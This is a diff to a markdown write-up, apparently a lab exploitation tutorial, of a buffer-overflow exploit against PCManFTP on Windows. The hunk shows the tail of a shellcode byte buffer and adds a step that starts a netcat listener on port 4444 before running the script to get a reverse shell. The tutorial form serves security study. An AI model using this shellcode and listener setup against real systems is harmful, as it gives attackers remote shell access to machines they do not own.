@@ -160,5 +160,9 @@ buf += b"\xa0\x63\xde\x2c\x23\x81\x9f\xca\x3b\xe0\x9a\x97\xfb\x19\xd7"
 buf += b"\x88\x69\x1d\x44\xa8\xbb"
 ```
 
-Once we are all set, we can run the script and if all went correctly, we should now have a reverse shell to the Windows machine, running as the same account that is running the PCManFTP software.
+Once we are all set, we need a terminal window opened an netcat running:
+
+`nc -lvp 4444'
+
+Then, in another terminal window, we can run the script and if all went correctly, we should now have a reverse shell to the Windows machine, running as the same account that is running the PCManFTP software.
 
